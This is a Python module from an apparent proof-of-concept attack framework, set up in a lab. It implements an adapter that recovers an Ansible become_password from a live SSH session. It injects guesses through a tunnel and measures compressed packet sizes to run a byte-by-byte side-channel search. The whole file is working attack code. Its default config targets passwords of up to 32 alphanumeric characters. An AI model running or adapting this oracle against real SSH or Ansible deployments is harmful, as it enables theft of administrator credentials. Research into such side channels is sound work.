"""Ansible adapter — fresh SSH per guess.

Each oracle query triggers a fresh ansible-playbook run on the client
via /send_secret_ansible, then opens a direct-tcpip channel through
the already-live SSH connection via the client's Ansible LocalForward
port. No flush is needed — the fresh SSH connection starts with an
empty zlib window.

Ordering per oracle query (preserved from attacker/attack_ansible.py):
  1. Trigger ansible-playbook run (blocks until "Sending become_password").
  2. Open the measure tunnel (direct-tcpip CHANNEL_OPEN).
  3. Settle so CHANNEL_OPEN reaches the sniffer.
  4. Clear packet log.
  5. Write guess on the measure tunnel.
  6. Settle.
  7. Read packet log.
  8. Close the measure tunnel.
"""

from __future__ import annotations

import asyncio
import logging
import os
from typing import TYPE_CHECKING, Any

from attacker.attack.config import AttackConfig, AlignmentMode
from attacker.attack.adapters.direct import CLIENT_BASE, _sum_c2s

if TYPE_CHECKING:
    import aiohttp

LOG = logging.getLogger("attack.ansible")

CLIENT_HOST = os.environ.get("CLIENT_HOST", "client")
ANSIBLE_TUNNEL_PORT = int(os.environ.get("ANSIBLE_TUNNEL_PORT", "15432"))


class AnsibleAdapter:
    def __init__(self, packet_log: Any) -> None:
        self._packet_log = packet_log
        self._config: AttackConfig | None = None
        self._session: "aiohttp.ClientSession | None" = None

    async def setup(self, config: AttackConfig, http_session: "aiohttp.ClientSession") -> None:
        self._config = config
        self._session = http_session

    async def teardown(self) -> None:
        self._config = None
        self._session = None

    async def measure_once(
        self, prefix: bytes, candidate: bytes, alignment: bytes,
    ) -> int:
        cfg = self._config
        assert cfg is not None and self._session is not None

        # 1. Trigger ansible-playbook run (blocks until password in flight)
        async with self._session.post(f"{CLIENT_BASE}/send_secret_ansible") as r:
            body = await r.json()
            if not body.get("ok", False):
                raise RuntimeError(f"send_secret_ansible failed: {body}")

        # 2. Open measure tunnel
        try:
            _, mw = await _open_ansible_tunnel()
        except OSError as exc:
            LOG.warning("ansible measure open failed: %s", exc)
            return 0

        # 3. Settle so CHANNEL_OPEN reaches the sniffer
        if cfg.settle > 0:
            await asyncio.sleep(cfg.settle)

        # 4-7. Clear, write guess, settle, read
        self._packet_log.clear()
        try:
            mw.write(prefix + candidate + alignment)
            await mw.drain()
        except (ConnectionResetError, BrokenPipeError, OSError) as exc:
            LOG.warning("ansible measure write failed: %s", exc)
        if cfg.settle > 0:
            await asyncio.sleep(cfg.settle)
        measured = _sum_c2s(
            self._packet_log.snapshot(), cfg.measurement_min_segment_size,
        )

        # 8. Close
        try:
            mw.close()
        except Exception:  # noqa: BLE001
            pass

        return measured

    @classmethod
    def default_config(cls) -> AttackConfig:
        return AttackConfig(
            known_prefix=b"\x5e\x00\x00\x00\x00\x00\x00\x00",
            alphabet=[bytes([c]) for c in b"abcdefghijklmnopqrstuvwxyz0123456789"],
            max_length=32,
            terminator=b"\n",
            min_margin=8,
            max_rounds=128,
            settle=0.25,
            alignment_mode=AlignmentMode.FULL_SWEEP,
            alignment_lengths=[0, 1, 2, 3, 4, 5, 6, 7],
            candidate_elimination=True,
            constant_prefix_trim=True,
            adaptive_alignment=False,
            stall_detection=False,
            alignment_hint_carryover=False,
            outlier_threshold=0,
            flush_bytes=0,
            flush_pool="none",
            measurement_min_segment_size=0,
            candidate_fork_on_stall=False,
            fork_top_k=5,
            max_fork_depth=2,
            label="ansible-default",
        )


async def _open_ansible_tunnel(retries: int = 20, delay: float = 0.25) -> tuple:
    for attempt in range(1, retries + 1):
        try:
            return await asyncio.open_connection(CLIENT_HOST, ANSIBLE_TUNNEL_PORT)
        except (OSError, ConnectionRefusedError):
            if attempt >= retries:
                raise
            await asyncio.sleep(delay)
    raise RuntimeError("unreachable")
